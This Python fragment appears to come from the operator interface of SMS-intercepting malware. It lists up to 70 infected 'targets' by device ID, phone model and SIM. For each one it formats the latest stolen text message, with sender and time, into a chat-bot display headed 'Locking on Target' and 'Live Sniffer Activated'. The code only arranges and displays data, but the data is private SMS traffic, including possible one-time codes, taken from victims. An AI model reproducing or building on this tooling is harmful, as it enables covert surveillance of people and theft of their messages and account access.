def format_target_list(devices):
    targets = []
    for idx, (device_id, data) in enumerate(devices.items(), 1):
        if data.get('sim') and len(data.get('sim', '').strip()) > 0:
            targets.append({
                'id': device_id,
                'model': data.get('model', 'Unknown'),
                'sim': data.get('sim', 'N/A'),
                'from': data.get('from', 'Unknown'),
                'message': data.get('message', 'No message'),
                'time': data.get('time', 'Unknown')
            })
    return targets[:70]

def format_sms_display(device_data, device_id):
    sim = device_data.get('sim', 'N/A')
    model = device_data.get('model', 'Unknown')
    from_id = device_data.get('from', 'Unknown')
    time = device_data.get('time', 'Unknown')
    message = device_data.get('message', 'No message available')
    
    display = f"""
🔴 *Locking on Target... Fetching details.*
{time}

*📩 CURRENT LATEST SMS*

• *From:* `{from_id}`
  *Model:* {model}
  *SIM:* {sim} | SIM -1
  *Time:* {time}

*📝 Message:*
{message}

*🆔 ID:* `{device_id}`
{time}

*📡 Live Sniffer Activated for {model}*
Stay tuned! 🎉
"""
    return display
